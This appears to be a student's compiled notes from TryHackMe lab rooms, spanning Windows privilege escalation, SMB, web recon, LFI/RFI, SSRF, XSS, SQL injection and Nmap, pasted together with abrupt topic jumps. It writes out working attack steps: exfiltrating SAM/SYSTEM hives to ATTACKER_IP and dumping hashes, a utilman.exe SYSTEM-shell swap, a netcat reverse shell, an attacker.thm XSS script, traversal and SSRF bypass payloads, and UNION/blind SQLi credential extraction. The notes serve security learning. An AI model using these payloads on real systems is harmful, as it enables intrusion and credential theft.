Windows Privileges

Privileges are rights that an account has to perform specific system-related tasks. These tasks can be as simple as the privilege to shut down the machine up to privileges to bypass some DACL-based access controls.

Each user has a set of assigned privileges that can be checked with the following command:

whoami /priv

A complete list of available privileges on Windows systems is available here. From an attacker's standpoint, only those privileges that allow us to escalate in the system are of interest. You can find a comprehensive list of exploitable privileges on the Priv2Admin Github project.

While we won't take a look at each of them, we will showcase how to abuse some of the most common privileges you can find.


SeBackup / SeRestore

The SeBackup and SeRestore privileges allow users to read and write to any file in the system, ignoring any DACL in place. The idea behind this privilege is to allow certain users to perform backups from a system without requiring full administrative privileges.

Having this power, an attacker can trivially escalate privileges on the system by using many techniques. The one we will look at consists of copying the SAM and SYSTEM registry hives to extract the local Administrator's password hash.

Log in to the target machine via RDP using the following credentials:

User: THMBackup

Password: CopyMaster555

This account is part of the "Backup Operators" group, which by default is granted the SeBackup and SeRestore privileges. We will need to open a command prompt using the "Open as administrator" option to use these privileges. We will be asked to input our password again to get an elevated console:

Run as admin

Once on the command prompt, we can check our privileges with the following command:
Command Prompt

C:\> whoami /priv

PRIVILEGES INFORMATION
----------------------

============================= ============================== ========

SeRestorePrivilege            Restore files and directories  Disabled
SeShutdownPrivilege           Shut down the system           Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled

        

To backup the SAM and SYSTEM hashes, we can use the following commands:
Command Prompt

C:\> reg save hklm\system C:\Users\THMBackup\system.hive
The operation completed successfully.

C:\> reg save hklm\sam C:\Users\THMBackup\sam.hive
The operation completed successfully.

        

This will create a couple of files with the registry hives content. We can now copy these files to our attacker machine using SMB or any other available method. For SMB, we can use impacket's smbserver.py to start a simple SMB server with a network share in the current directory of our AttackBox:
Kali Linux

user@attackerpc$ mkdir share
user@attackerpc$ python3.9 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share
        

This will create a share named public pointing to the share directory, which requires the username and password of our current windows session. After this, we can use the copy command in our windows machine to transfer both files to our AttackBox: 
Command Prompt

C:\> copy C:\Users\THMBackup\sam.hive \\ATTACKER_IP\public\
C:\> copy C:\Users\THMBackup\system.hive \\ATTACKER_IP\public\

        

And use impacket to retrieve the users' password hashes:
Kali Linux

user@attackerpc$ python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation

SeTakeOwnership

The SeTakeOwnership privilege allows a user to take ownership of any object on the system, including files and registry keys, opening up many possibilities for an attacker to elevate privileges, as we could, for example, search for a service running as SYSTEM and take ownership of the service's executable. For this task, we will be taking a different route, however.

Log in to the target machine via RDP using the following credentials:

User: THMTakeOwnership

Password: TheWorldIsMine2022

To get the SeTakeOwnership privilege, we need to open a command prompt using the "Open as administrator" option. We will be asked to input our password to get an elevated console:

Run as admin

Once on the command prompt, we can check our privileges with the following command:
Command Prompt

We'll abuse utilman.exe to escalate privileges this time. Utilman is a built-in Windows application used to provide Ease of Access options during the lock screen:

utilman normal behaviour

Since Utilman is run with SYSTEM privileges, we will effectively gain SYSTEM privileges if we replace the original binary for any payload we like. As we can take ownership of any file, replacing it is trivial.

To replace utilman, we will start by taking ownership of it with the following command:
Command Prompt

C:\> takeown /f C:\Windows\System32\Utilman.exe

SUCCESS: The file (or folder): "C:\Windows\System32\Utilman.exe" now owned by user "WINPRIVESC2\thmtakeownership".

        

Notice that being the owner of a file doesn't necessarily mean that you have privileges over it, but being the owner you can assign yourself any privileges you need. To give your user full permissions over utilman.exe you can use the following command:
Command Prompt

C:\> icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F
processed file: Utilman.exe
Successfully processed 1 files; Failed processing 0 files

        

After this, we will replace utilman.exe with a copy of cmd.exe:
Command Prompt

C:\Windows\System32\> copy cmd.exe utilman.exe
        1 file(s) copied.

        

To trigger utilman, we will lock our screen from the start button:

lock screen

And finally, proceed to click on the "Ease of Access" button, which runs utilman.exe with SYSTEM privileges. Since we replaced it with a cmd.exe copy, we will get a command prompt with SYSTEM privileges:

utilman shell


SeImpersonate / SeAssignPrimaryToken

These privileges allow a process to impersonate other users and act on their behalf. Impersonation usually consists of being able to spawn a process or thread under the security context of another user.

Impersonation is easily understood when you think about how an FTP server works. The FTP server must restrict users to only access the files they should be allowed to see.

Let's assume we have an FTP service running with user ftp. Without impersonation, if user Ann logs into the FTP server and tries to access her files, the FTP service would try to access them with its access token rather than Ann's:

FTP server without impersonation

There are several reasons why using ftp's token is not the best idea: - For the files to be served correctly, they would need to be accessible to the ftp user. In the example above, the FTP service would be able to access Ann's files, but not Bill's files, as the DACL in Bill's files doesn't allow user ftp. This adds complexity as we must manually configure specific permissions for each served file/directory. - For the operating system, all files are accessed by user ftp, independent of which user is currently logged in to the FTP service. This makes it impossible to delegate the authorisation to the operating system; therefore, the FTP service must implement it. - If the FTP service were compromised at some point, the attacker would immediately gain access to all of the folders to which the ftp user has access.

If, on the other hand, the FTP service's user has the SeImpersonate or SeAssignPrimaryToken privilege, all of this is simplified a bit, as the FTP service can temporarily grab the access token of the user logging in and use it to perform any task on their behalf:

FTP server with impersonation

Now, if user Ann logs in to the FTP service and given that the ftp user has impersonation privileges, it can borrow Ann's access token and use it to access her files. This way, the files don't need to provide access to user ftp in any way, and the operating system handles authorisation. Since the FTP service is impersonating Ann, it won't be able to access Jude's or Bill's files during that session.

As attackers, if we manage to take control of a process with SeImpersonate or SeAssignPrimaryToken privileges, we can impersonate any user connecting and authenticating to that process.

In Windows systems, you will find that the LOCAL SERVICE and NETWORK SERVICE ACCOUNTS already have such privileges. Since these accounts are used to spawn services using restricted accounts, it makes sense to allow them to impersonate connecting users if the service needs. Internet Information Services (IIS) will also create a similar default account called "iis apppool\defaultapppool" for web applications.

To elevate privileges using such accounts, an attacker needs the following: 1. To spawn a process so that users can connect and authenticate to it for impersonation to occur. 2. Find a way to force privileged users to connect and authenticate to the spawned malicious process.

We will use RogueWinRM exploit to accomplish both conditions.

Let's start by assuming we have already compromised a website running on IIS and that we have planted a web shell on the following address:

http://10.10.199.94/

We can use the web shell to check for the assigned privileges of the compromised account and confirm we hold both privileges of interest for this task:

Webshell impersonate privileges

To use RogueWinRM, we first need to upload the exploit to the target machine. For your convenience, this has already been done, and you can find the exploit in the C:\tools\ folder.

The RogueWinRM exploit is possible because whenever a user (including unprivileged users) starts the BITS service in Windows, it automatically creates a connection to port 5985 using SYSTEM privileges. Port 5985 is typically used for the WinRM service, which is simply a port that exposes a Powershell console to be used remotely through the network. Think of it like SSH, but using Powershell.

If, for some reason, the WinRM service isn't running on the victim server, an attacker can start a fake WinRM service on port 5985 and catch the authentication attempt made by the BITS service when starting. If the attacker has SeImpersonate privileges, he can execute any command on behalf of the connecting user, which is SYSTEM.

Before running the exploit, we'll start a netcat listener to receive a reverse shell on our attacker's machine:
Kali Linux

user@attackerpc$ nc -lvp 4442

        

And then, use our web shell to trigger the RogueWinRM exploit using the following command:

c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe ATTACKER_IP 4442"

RogueWinRM exploit execution

Note: The exploit may take up to 2 minutes to work, so your browser may appear as unresponsive for a bit. This happens if you run the exploit multiple times as it must wait for the BITS service to stop before starting it again. The BITS service will stop automatically after 2 minutes of starting.

The -p parameter specifies the executable to be run by the exploit, which is nc64.exe in this case. The -a parameter is used to pass arguments to the executable. Since we want nc64 to establish a reverse shell against our attacker machine, the arguments to pass to netcat will be -e cmd.exe ATTACKER_IP 4442.

If all was correctly set up, you should expect a shell with SYSTEM privileges:
Kali Linux

user@attackerpc$ nc -lvp 4442

automated tools 
WinPEAS

WinPEAS is a script developed to enumerate the target system to uncover privilege escalation paths. You can find more information about winPEAS and download either the precompiled executable or a .bat script. WinPEAS will run commands similar to the ones listed in the previous task and print their output. The output from winPEAS can be lengthy and sometimes difficult to read. This is why it would be good practice to always redirect the output to a file, as shown below:
Command Prompt

           
C:\> winpeas.exe > outputfile.txt

        

WinPEAS can be downloaded here.


PrivescCheck

PrivescCheck is a PowerShell script that searches common privilege escalation on the target system. It provides an alternative to WinPEAS without requiring the execution of a binary file.

PrivescCheck can be downloaded here.

Reminder: To run PrivescCheck on the target system, you may need to bypass the execution policy restrictions. To achieve this, you can use the Set-ExecutionPolicy cmdlet as shown below.
Powershell

           
PS C:\> Set-ExecutionPolicy Bypass -Scope process -Force
PS C:\> . .\PrivescCheck.ps1
PS C:\> Invoke-PrivescCheck

        


WES-NG: Windows Exploit Suggester - Next Generation

Some exploit suggesting scripts (e.g. winPEAS) will require you to upload them to the target system and run them there. This may cause antivirus software to detect and delete them. To avoid making unnecessary noise that can attract attention, you may prefer to use WES-NG, which will run on your attacking machine (e.g. Kali or TryHackMe AttackBox).

WES-NG is a Python script that can be found and downloaded here.

Once installed, and before using it, type the wes.py --update command to update the database. The script will refer to the database it creates to check for missing patches that can result in a vulnerability you can use to elevate your privileges on the target system.

To use the script, you will need to run the systeminfo command on the target system. Do not forget to direct the output to a .txt file you will need to move to your attacking machine.

Once this is done, wes.py can be run as follows;
Kali Linux

user@kali$ wes.py systeminfo.txt


Metasploit

If you already have a Meterpreter shell on the target system, you can use the multi/recon/local_exploit_suggester module to list vulnerabilities that may affect the target system and allow you to elevate your privileges on the target system.

Samba is the standard Windows interoperability suite of programs for Linux and Unix. It allows end users to access and use files, printers and other commonly shared resources on a companies intranet or internet. Its often referred to as a network file system.

Samba is based on the common client/server protocol of Server Message Block (SMB). SMB is developed only for Windows, without Samba, other computer platforms would be isolated from Windows machines, even if they were part of the same network

  https://raw.githubusercontent.com/borjmz/aspx-reverse-shell/master/shell.aspx
psexec.py user:'password'@10.10.32.51

Lcd specifies the default directory on your workstation—the directory in which smbclient looks for the files you want to send and puts the files you've received. Cd specifies the default directory for the server. So, if you're connected to a share that contains a directory named mail, from which you want to copy some files to a directory named /mymailfiles on your local Linux box, you can set those directories as the default directories by typing

  cd mail
  lcd /mymailfiles

Here's one final hint about using smbclient. Sometime you might need to use smbclient on someone else's Linux system. If the system's owner has never used smbclient and hasn't created the smb.conf file, Linux can't check smb.conf for the WINS server's location, and consequently smbclient often can't find the Win2K or NT server that you're trying to connect to. (For an explanation of the smb.conf file, see "Connecting Linux Workstations to Windows 2000 and NT Servers.")

You can, of course, create an smb.conf file. But if you don't want to do that much work, you can lead smbclient by the nose to your Win2K or NT server with the -W and -I options. The -W option lets you enter a domain's name, and the -I option lets you specify the server's IP address. So, using my earlier example, if I knew that \\BIGSERVE had an IP address of 200.200.200.10 and that my usermark account was in the domain GUYS, I could invoke smbclient with the command

smbclient //bigserve/plans -I   200.200.200.10 -W guys -U usermark%swordfish

This little bit of JavaScript is what is removing the red popup from the page. We can utilise another feature of debugger called breakpoints. These are points in the code that we can force the browser to stop processing the JavaScript and pause the current execution.

#Robots.txt
The robots.txt file is a document that tells search engines which pages they are and aren't allowed to show on their search engine results or ban specific search engines from crawling the website altogether. It can be common practice to restrict certain website areas so they aren't displayed in search engine results. These pages may be areas such as administration portals or files meant for the website's customers. This file gives us a great list of locations on the website that the owners don't want us to discover as penetration testers.

#Sitemap.xml
Unlike the robots.txt file, which restricts what search engine crawlers can look at, the sitemap.xml file gives a list of every file the website owner wishes to be listed on a search engine. These can sometimes contain areas of the website that are a bit more difficult to navigate to or even list some old webpages that the current site no longer uses but are still working behind the scenes.

Another useful search is following intitle:index.of followed by a search keyword. This can give a list of files on the servers. For example, intitle:index.of mp3 will give all the MP3 files available on various types of servers. 

#OSINT - Wayback Machine
The Wayback Machine (https://archive.org/web/) is a historical archive of websites that dates back to the late 90s. You can search a domain name, and it will show you all the times the service scraped the web page and saved the contents. This service can help uncover old pages that may still be active on the current website.

#S3 Buckets
S3 Buckets are a storage service provided by Amazon AWS, allowing people to save files and even static website content in the cloud accessible over HTTP and HTTPS. The owner of the files can set access permissions to either make files public, private and even writable. Sometimes these access permissions are incorrectly set and inadvertently allow access to files that shouldn't be available to the public. The format of the S3 buckets is http(s)://{name}.s3.amazonaws.com where {name} is decided by the owner, such as tryhackme-assets.s3.amazonaws.com. S3 buckets can be discovered in many ways, such as finding the URLs in the website's page source, GitHub repositories, or even automating the process. One common automation method is by using the company name followed by common terms such as {name}-assets, {name}-www, {name}-public, {name}-private, etc.

#Logic flaws
In the application, the user account is retrieved using the query string, but later on, in the application logic, the password reset email is sent using the data found in the PHP variable $_REQUEST.


The PHP $_REQUEST variable is an array that contains data received from the query string and POST data. If the same key name is used for both the query string and POST data, the application logic for this variable favours POST data fields rather than the query string, so if we add another parameter to the POST form, we can control where the password reset email gets delivered.
curl 'http://10.10.70.209/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert'

#Hashing
#encoding
Encoding is similar to hashing in that it creates what would seem to be a random string of text, but in fact, the encoding is reversible. So it begs the question, what is the point in encoding? Encoding allows us to convert binary data into human-readable text that can be easily and safely transmitted over mediums that only support plain text ASCII characters.

Common encoding types are base32 which converts binary data to the characters A-Z and 2-7, and base64 which converts using the characters a-z, A-Z, 0-9,+, / and the equals sign for padding.


Take the below data as an example which is set by the web server upon logging in:

Set-Cookie: session=eyJpZCI6MSwiYWRtaW4iOmZhbHNlfQ==; Max-Age=3600; Path=/
This string base64 decoded has the value of {"id":1,"admin": false} we can then encode this back to base64 encoded again but instead setting the admin value to true, which now gives us admin access.

=============
#LFI
Examples wih PHP
1. It works because there isn't a directory specified in the include function and no input validation.
http://webapp.thm/get.php?file=/etc/passwd
<?PHP 
	include($_GET["lang"]);
?>

2. If there is no input validation, the attacker can manipulate the URL by replacing the lang input with other OS-sensitive files such as /etc/passwd.
<?PHP 
	include("languages/". $_GET['lang']); 
?>

3. Using null bytes
Using null bytes is an injection technique where URL-encoded representation such as %00 or 0x00 in hex with user-supplied data to terminate strings. You could think of it as trying to trick the web app into disregarding whatever comes after the Null Byte.
The %00 trick is fixed and not working with PHP 5.3.4 and above.

4.In this section, the developer decided to filter keywords to avoid disclosing sensitive information! The /etc/passwd file is being filtered. There are two possible methods to bypass the filter. First, by using the NullByte %00 or the current directory trick at the end of the filtered keyword /.. The exploit will be similar to http://webapp.thm/index.php?lang=/etc/passwd/. We could also use http://webapp.thm/index.php?lang=/etc/passwd%00

5. The developer starts to use input validation by filtering some keywords. The web application replaces the ../ with the empty string. There are a couple of techniques we can use to bypass this.

First, we can send the following payload to bypass it: ....//....//....//....//....//etc/passwd

Why did this work?

This works because the PHP filter only matches and replaces the first subset string ../ it finds and doesn't do another pass,

6. The developer forces the include to read from a defined directory! For example, if the web application asks to supply input that has to include a directory such as: http://webapp.thm/index.php?lang=languages/EN.php then, to exploit this, we need to include the directory in the payload like so: ?lang=languages/../../../../../etc/passwd

========
#RFI
An external server must communicate with the application server for a successful RFI attack where the attacker hosts malicious files on their server. Then the malicious file is injected into the include function via HTTP requests, and the content of the malicious file executes on the vulnerable application server.

host vcs.fsf.org
    HostkeyAlgorithms +ssh-rsa
    PubkeyAcceptedAlgorithms +ssh-rsa

ssh -oHostKeyAlgorithms=+ssh-dss -i id_rsa root@<ip>
  OpenSSH since 7.0 doesn't accept hostkey ssh-dss and you must add it, similarly since 8.8 it doesn't use client ssh-rsa and you must add that with -oPubkeyAcceptedAlgorithms=+ssh-rsa.

2. Path traversal 
    http://website.thm/stock?url=/../user
3. Server subdomain to wich the request is made
    http://website.thme/stock?server=api.website.thm/api/user&x=&id=123
    the payload ending in &x= is being used to stop the remaining path from being appended to the end of the attacker's URL and instead turns it into a paramter (?x=) on the query string

4. Change a value like in an avatar election with a payload like x/../private being private a directory interesting

#Defeating common SSRF 
Deny list
Attackers can bypass a Deny List by using alternative localhost references such as 0, 0.0.0.0, 0000, 127.1, 127.*.*.*, 2130706433, 017700000001 or subdomains that have a DNS record which resolves to the IP Address 127.0.0.1 such as 127.0.0.1.nip.io.

Also, in a cloud environment, it would be beneficial to block access to the IP address 169.254.169.254, which contains metadata for the deployed cloud server, including possibly sensitive information. An attacker can bypass this by registering a subdomain on their own domain with a DNS record that points to the IP Address 169.254.169.254


Allow List
An allow list is where all requests get denied unless they appear on a list or match a particular pattern, such as a rule that an URL used in a parameter must begin with https://website.thm. An attacker could quickly circumvent this rule by creating a subdomain on an attacker's domain name, such as https://website.thm.attackers-domain.thm. The application logic would now allow this input and let an attacker control the internal HTTP request.


Open Redirect

If the above bypasses do not work, there is one more trick up the attacker's sleeve, the open redirect. An open redirect is an endpoint on the server where the website visitor gets automatically redirected to another website address. Take, for example, the link https://website.thm/link?url=https://tryhackme.com.

-----
Stored XSS
the XSS payload is stored on the web application (in a database, for example) and then gets run when other users visit the site or web page.

Example Scenario:
  A blog website that allows users to post comments. Unfortunately, these comments aren't checked for whether they contain JavaScript or filter out any malicious code. If we now post a comment containing JavaScript, this will be stored in the database, and every other user now visiting the article will have the JavaScript run in their browser.

-----
Blind XSS
Blind XSS is similar to a stored XSS in that your payload gets stored on the website for another user to view, but in this instance, you can't see the payload working or be able to test it against yourself first.

Example Scenario:

A website has a contact form where you can message a member of staff. The message content doesn't get checked for any malicious code, which allows the attacker to enter anything they wish. These messages then get turned into support tickets which staff view on a private web portal.

Potential Impact:

Using the correct payload, the attacker's JavaScript could make calls back to an attacker's website, revealing the staff portal URL, the staff member's cookies, and even the contents of the portal page that is being viewed. Now the attacker could potentially hijack the staff member's session and have access to the private portal.
xsshunter is a popular tool

-----
Reflected XSS
Example scenario
  A website where if you enter incorrect input, an error message is displayed. The content of the error message gets taken from the error parameter in the query string and is built directly into the page source.

Reflected XSS happens when user-supplied data in an HTTP request is included in the webpage source without any validation. The attacker could send links or embed them into an iframe on another website containing a JavaScript payload to potential victims getting them to execute code on their browser, potentially revealing session or customer information.
  https://website.thm/?error=<script src="https://attacker.thm/evil.js"></script>


-----
Exploiting the DOM

DOM Based XSS is where the JavaScript execution happens directly in the browser without any new pages being loaded or data submitted to backend code. Execution occurs when the website JavaScript code acts on input or user interaction.

Example Scenario:
  The website's JavaScript gets the contents from the window.location.hash parameter and then writes that onto the page in the currently being viewed section. The contents of the hash aren't checked for malicious code, allowing an attacker to inject JavaScript of their choosing onto the webpage.

DOM Based XSS can be challenging to test for and requires a certain amount of knowledge of JavaScript to read the source code. You'd need to look for parts of the code that access certain variables that an attacker can have control over, such as "window.location.x" parameters.

When you've found those bits of code, you'd then need to see how they are handled and whether the values are ever written to the web page's DOM or passed to unsafe JavaScript methods such as eval().

SQL
A database is controlled by a DBMS which is an acronym for  Database Management System, DBMS's fall into two camps Relational or Non-Relational, the focus of this room will be on Relational databases,  some common one's you'll come across are MySQL, Microsoft SQL Server, Access, PostgreSQL and SQLite

Non-relational databases sometimes called NoSQL on the other hand is any sort of database that doesn't use tables, columns and rows to store the data, a specific database layout doesn't need to be constructed so each row of data can contain different information which can give more flexibility over a relational database.  Some popular databases of this type are MongoDB, Cassandra and ElasticSearch

It's worth noting that SQL syntax is not case sensitive.

Inside mysql (with credentials). An example
mysql -u wordpress -p 
show databases;
use phpmyadmin;
show tables;
describe usernames_table;

Example:
  select * from users;
    The semicolon at the end tells the database that this is the end of the query.  

  select * from users LIMIT 1;
    This query, like the first, returns all the columns by using the * selector and then the "LIMIT 1" clause forces the database only to return one row of data. Changing the query to "LIMIT 1,1" forces the query to skip the first result, and then "LIMIT 2,1" skips the first two results, and so on. You need to remember the first number tells the database how many results you wish to skip, and the second number tells the database how many rows to return.

  select * from users where username='admin';

  select * from users where username like 'a%';
    This returns any rows with username beginning with the letter a.

  select * from users where username like '%n';
    This returns any rows with username ending with the letter n.

  select * from users where username like '%mi%';
    This returns any rows with a username containing the characters mi within them.

  SELECT name,address,city,postcode from customers UNION SELECT company,address,city,postcode from suppliers;
    The UNION statement combines the results of two or more SELECT statements to retrieve data from either single or multiple tables; the rules to this query are that the UNION statement must retrieve the same number of columns in each SELECT statement, the columns have to be of a similar data type and the column order has to be the same. 

  insert into users (username,password) values ('bob','password123');
    The INSERT statement tells the database we wish to insert a new row of data into the table. "into users" tells the database which table we wish to insert the data into, "(username,password)" provides the columns we are providing data for and then "values ('bob','password');" provides the data for the previously specified columns

  update users SET username='root',password='pass123' where username='admin';
    The UPDATE statement tells the database we wish to update one or more rows of data within a table. You specify the table you wish to update using "update %tablename% SET" and then select the field or fields you wish to update as a comma-separated list such as "username='root',password='pass123'" then finally similar to the SELECT statement, you can specify exactly which rows to update using the where clause such as "where username='admin;".

  delete from users where username='martin';
    The DELETE statement tells the database we wish to delete one or more rows of data. Apart from missing the columns you wish to be returned, the format of this query is very similar to the SELECT. You can specify precisely which data to delete using the where clause and the number of rows to be deleted using the LIMIT clause.

  SELECT * from blog where id=1 and private=0 LIMIT 1;
    the SQL statement above is looking in the blog table for an article with the id number of 1 and the private column set to 0, which means it's able to be viewed by the public and limits the results to only one match


-=-=-=-=-=-
SQLi
   Let's pretend article id 2 is still locked as private, so it cannot be viewed on the website. We could now instead call the URL:
  https://website.thm/blog?id=2;--

  Which would then, in turn, produce the SQL statement:
  SELECT * from blog where id=2;-- and private=0 LIMIT 1;
  The semicolon in the URL signifies the end of the SQL statement, and the two dashes cause everything afterwards to be treated as a comment. By doing this, you're just, in fact, running the query:

  SELECT * from blog where id=2;--
  Which will return the article with an id of 2 whether it is set to public or notes

In-Band SQL Injection
In-Band SQL Injection is the easiest type to detect and exploit; In-Band just refers to the same method of communication being used to exploit the vulnerability and also receive the results, for example, discovering an SQL Injection vulnerability on a website page and then being able to extract data from the database to the same page.


Error-Based SQL Injection
This type of SQL Injection is the most useful for easily obtaining information about the database structure as error messages from the database are printed directly to the browser screen. This can often be used to enumerate a whole database. 


Union-Based SQL Injection
  This type of Injection utilises the SQL UNION operator alongside a SELECT statement to return additional results to the page. This method is the most common way of extracting large amounts of data via an SQL Injection vulnerability.

  The key to discovering error-based SQL Injection is to break the code's SQL query by trying certain characters until an error message is produced; these are most commonly single apostrophes ( ' ) or a quotation mark ( " ).

  Try typing an apostrophe ( ' ) after the id=1 and press enter. And you'll see this returns an SQL error informing you of an error in your syntax. The fact that you've received this error message confirms the existence of an SQL Injection vulnerability. We can now exploit this vulnerability and use the error messages to learn more about the database structure. 

  The first thing we need to do is return data to the browser without displaying an error message. Firstly we'll try the UNION operator so we can receive an extra result of our choosing. Try setting the mock browsers id parameter to:
  1 UNION SELECT 1

  This statement should produce an error message informing you that the UNION SELECT statement has a different number of columns than the original SELECT query. So let's try again but add another column:
  1 UNION SELECT 1,2

  Same error again, so let's repeat by adding another column:
  1 UNION SELECT 1,2,3

  Success, the error message has gone, and the article is being displayed, but now we want to display our data instead of the article. The article is being displayed because it takes the first returned result somewhere in the web site's code and shows that. To get around that, we need the first query to produce no results. This can simply be done by changing the article id from 1 to 0.
  0 UNION SELECT 1,2,3

  You'll now see the article is just made up of the result from the UNION select returning the column values 1, 2, and 3. We can start using these returned values to retrieve more useful information. First, we'll get the database name that we have access to:
  0 UNION SELECT 1,2,database()
  You'll now see where the number 3 was previously displayed; it now shows the name of the database, which is sqli_one.

  Our next query will gather a list of tables that are in this database.
  0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'

  There are a couple of new things to learn in this query. Firstly, the method group_concat() gets the specified column (in our case, table_name) from multiple returned rows and puts it into one string separated by commas. The next thing is the information_schema database; every user of the database has access to this, and it contains information about all the databases and tables the user has access to. In this particular query, we're interested in listing all the tables in the sqli_one database, which is article and staff_users. 


  As the first level aims to discover Martin's password, the staff_users table is what is of interest to us. We can utilise the information_schema database again to find the structure of this table using the below query.
  0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'

  This is similar to the previous SQL query. However, the information we want to retrieve has changed from table_name to column_name, the table we are querying in the information_schema database has changed from tables to columns, and we're searching for any rows where the table_name column has a value of staff_users.

  The query results provide three columns for the staff_users table: id, password, and username. We can use the username and password columns for our following query to retrieve the user's information.
  0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users


  Again we use the group_concat method to return all of the rows into one string and to make it easier to read. We've also added ,':', to split the username and password from each other. Instead of being separated by a comma, we've chosen the HTML <br> tag that forces each result to be on a separate line to make for easier reading.


###Blind SQLi - Authentication Bypass

Authentication Bypass
One of the most straightforward Blind SQL Injection techniques is when bypassing authentication methods such as login forms. In this instance, we aren't that interested in retrieving data from the database; We just want to get past the login. 

Login forms that are connected to a database of users are often developed in such a way that the web application isn't interested in the content of the username and password but more whether the two make a matching pair in the users table. In basic terms, the web application is asking the database "do you have a user with the username bob and the password bob123?", and the database replies with either yes or no (true/false) and, depending on that answer, dictates whether the web application lets you proceed or not. 
Taking the above information into account, it's unnecessary to enumerate a valid username/password pair. We just need to create a database query that replies with a yes/true.

  We could use ' or 1=1;--

###Blind SQLi - Boolean based
admin123' UNION SELECT 1,2,3 where database() like '%';--

We get a true response because, in the like operator, we just have the value of %, which will match anything as it's the wildcard value. If we change the wildcard operator to a%, you'll see the response goes back to false, which confirms that the database name does not begin with the letter a. We can cycle through all the letters, numbers and characters such as - and _ until we discover a match. If you send the below as the username value, you'll receive a true response that confirms the database name begins with the letter s.

admin123' UNION SELECT 1,2,3 where database() like 's%';--

###Blind SQLi - Time based
referrer=admin123' UNION SELECT SLEEP(5),2 where database() like 'u%';--

URL: It involves exchanging characters for their ASCII character code in hexadecimal format, preceded by a percentage symbol (%). Url encoding is an extremely useful method to know for any kind of web application testing.
For example, let's encode the forward-slash character (/). The ASCII character code for a forward slash is 47. This is "2F" in hexadecimal, making the URL encoded forward-slash %2F.

HTML: Encoding text as HTML Entities involves replacing special characters with an ampersand (&) followed by either a hexadecimal number or a reference to the character being escaped, then a semicolon (;). For example, a quotation mark has its own reference: &quot;. When this is inserted into a webpage, it will be replaced by a double quotation mark ("). This encoding method allows special characters in the HTML language to be rendered safely in HTML pages and has the added bonus of being used to prevent attacks such as XSS (Cross-Site Scripting).

Base64: Another widely used encoding method, base64 is used to encode any data in an ASCII-compatible format. It was designed to take binary data (e.g. images, media, programs) and encode it in a format that would be suitable to transfer over virtually any medium

ASCII Hex: This option converts data between ASCII representation and hexadecimal representation. For example, the word "ASCII" can be converted into the hexadecimal number "4153434949". Each letter in the original data is taken individually and converted from numeric ASCII representation into hexadecimal. For example, the letter "A" in ASCII has a decimal character code of 65. In hexadecimal, this is 41. Similarly, the letter "S" can be converted to hexadecimal 53, and so on.

ping

On Linux, traceroute will start by sending UDP datagrams within IP packets of TTL being 1. Thus, it causes the first router to encounter a TTL=0 and send an ICMP Time-to-Live exceeded back. Hence, a TTL of 1 will reveal the IP address of the first router to you. Then it will send another packet with TTL=2; this packet will be dropped at the second router. And so on.

*The number of hops/routers between your system and the target system depends on the time you are running traceroute. There is no guarantee that your packets will always follow the same route, even if you are on the same network or you repeat the traceroute command within a short time.
*Some routers return a public IP address. You might examine a few of these routers based on the scope of the intended penetration testing.
*Some routers don’t return a reply

nmap01

We present the different approaches that Nmap uses to discover live hosts. In particular, we cover:

    ARP scan: This scan uses ARP requests to discover live hosts
    ICMP scan: This scan uses ICMP requests to identify live hosts
    TCP/UDP ping scan: This scan sends packets to TCP ports and UDP ports to determine live hosts.

We also introduce two scanners, arp-scan and masscan, and explain how they overlap with part of Nmap’s host discovery.

Starting from bottom to top, we can use:

    ARP from Link Layer
    ICMP from Network Layer
    TCP from Transport Layer
    UDP from Transport Layer

ICMP has many types. ICMP ping uses Type 8 (Echo) and Type 0 (Echo Reply).
-=-=-=-=-=-=-=-=-=-=-=-=
Host Discovery using ARP 
If you want to ping a system on the same subnet, an ARP query should precede the ICMP Echo.

Although TCP and UDP are transport layers, for network scanning purposes, a scanner can send a specially-crafted packet to common TCP or UDP ports to check whether the target will respond. This method is efficient, especially when ICMP Echo is blocked.


There are various ways to discover online hosts. When no host discovery options are provided, Nmap follows the following approaches to discover live hosts:

    When a privileged user tries to scan targets on a local network (Ethernet), Nmap uses ARP requests. A privileged user is root or a user who belongs to sudoers and can run sudo.
    When a privileged user tries to scan targets outside the local network, Nmap uses ICMP echo requests, TCP ACK (Acknowledge) to port 80, TCP SYN (Synchronize) to port 443, and ICMP timestamp request.
    When an unprivileged user tries to scan targets outside the local network, Nmap resorts to a TCP 3-way handshake by sending SYN packets to ports 80 and 443.

Nmap, by default, uses a ping scan to find live hosts, then proceeds to scan live hosts only. If you want to use Nmap to discover online hosts without port-scanning the live systems, you can issue nmap -sn TARGETS. Let’s dig deeper to gain a solid understanding of the different techniques used.

ARP scan is possible only if you are on the same subnet as the target systems. On an Ethernet (802.3) and WiFi (802.11), you need to know the MAC address of any system before you can communicate with it. The MAC address is necessary for the link-layer header; the header contains the source MAC address and the destination MAC address among other fields. To get the MAC address, the OS sends an ARP query. A host that replies to ARP queries is up. The ARP query only works if the target is on the same subnet as yourself, i.e., on the same Ethernet/WiFi. You should expect to see many ARP queries generated during a Nmap scan of a local network. If you want Nmap only to perform an ARP scan without port-scanning, you can use nmap -PR -sn TARGETS, where -PR indicates that you only want an ARP scan. The following example shows Nmap using ARP for host discovery without any port scanning. We run nmap -PR -sn MACHINE_IP/24 to discover all the live systems on the same subnet as our target machine.

nmap -PR -sn 10.10.223.163/24

arp-scan --localnet OR arp-scan -l 
arp-scan -I eth0 -l
-=-=-=-=-=--=-=-=-=-=
Host Discovery using ICMP
To use ICMP echo request to discover live hosts, add the option -PE. (Remember to add -sn if you don’t want to follow that with a port scan.) As shown in the following figure, an ICMP echo scan works by sending an ICMP echo request and expects the target to reply with an ICMP echo reply if it is online.

#ICMP Echo
nmap -PE -sn 10.10.223.163/24
